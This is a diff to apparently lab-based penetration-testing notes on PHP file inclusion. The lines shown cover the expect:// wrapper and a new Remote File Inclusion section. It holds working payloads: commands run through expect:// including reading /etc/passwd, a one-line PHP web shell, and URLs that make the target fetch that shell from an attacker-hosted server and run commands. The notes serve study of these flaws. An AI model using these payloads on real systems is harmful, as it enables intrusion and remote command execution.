@@ -358,7 +358,7 @@ The expect wrapper has strict prerequisites and is therefore rare in modern envi
 
 - The Expect extension must be installed (php-expect)
 - The wrapper must be enabled at compile time
-- The application must be vulnerable to LFI using include() or require()
+- The application must be vulnerable to LFI using `include()` or `require()`
 - In most cases, `allow_url_include = On` is required
 
 Because the Expect extension is **not enabled by default**, this attack vector is uncommon, but extremely powerful when available.
@@ -372,3 +372,51 @@ http://94.237.55.43:35886/index.php?language=expect://id
 ```bash
 http://94.237.55.43:35886/index.php?language=expect://cat+/etc/passwd
 ```
+
+---
+
+## Remote File Inclusion (RFI)
+
+LFI allows an attacker to include files that are already present on the local server, while RFI allows an attacker to include files from a **remote location**, typically over HTTP or HTTPS. RFI vulnerabilities are commonly exploited by including a malicious script hosted by the attacker.
+
+LFI and RFI vulnerabilities are closely related, but they are not identical. RFI requires that the PHP configuration option `allow_url_include = On` is enabled, while LFI does not. As a result, not every LFI vulnerability is also exploitable as an RFI.
+
+To determine whether a discovered LFI is also an RFI, we attempt to include a remote resource.
+
+**Example:**
+
+```bash
+http://94.237.55.43:35886/index.php?language=http://127.0.0.1:80/index.php
+```
+
+If the application attempts to fetch and include the remote resource, RFI may be possible. Using **127.0.0.1** is useful to test remote inclusion without relying on external connectivity.
+
+If successful, we can proceed toward remote code execution (RCE) via RFI.
+
+**Step 1:**
+
+Create a simple web shell
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+**Step 2:**
+
+Host the web shell on a listening server
+```bash
+sudo python3 -m http.server 8001
+```
+
+**Step 3:**
+
+Include the payload through the LFI/RFI vulnerability
+
+```bash
+http://10.129.29.114/index.php?language=http://10.10.14.172:8001/shell.php&cmd=id
+```
+
+```bash
+http://10.129.29.114/index.php?language=http://10.10.14.172:8001/shell.php&cmd=cd+../../../;ls
+```
+
+![Filtered output](images/basic-rfi.png)
